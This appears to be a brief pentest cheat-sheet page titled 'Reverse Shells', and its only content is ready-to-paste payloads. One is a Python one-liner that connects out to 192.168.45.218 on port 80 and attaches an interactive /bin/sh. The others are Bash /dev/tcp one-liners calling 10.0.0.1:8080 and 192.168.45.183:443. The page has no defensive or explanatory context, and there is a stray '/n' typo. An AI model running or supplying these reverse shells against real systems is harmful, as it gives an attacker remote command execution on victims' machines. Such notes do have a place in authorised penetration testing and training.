---
title: "Reverse Shells"
---

Command:

<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' </code>
  <span style="margin-left: 10px; color: #555;"># Python</span>
  <br>
  <code> </code>
  <span style="margin-left: 10px; color: #555;"># </span>
  <br>
  <code>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 /n
  bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1" </code>
  <span style="margin-left: 10px; color: #555;"># Bash</span>
  <br>
</div>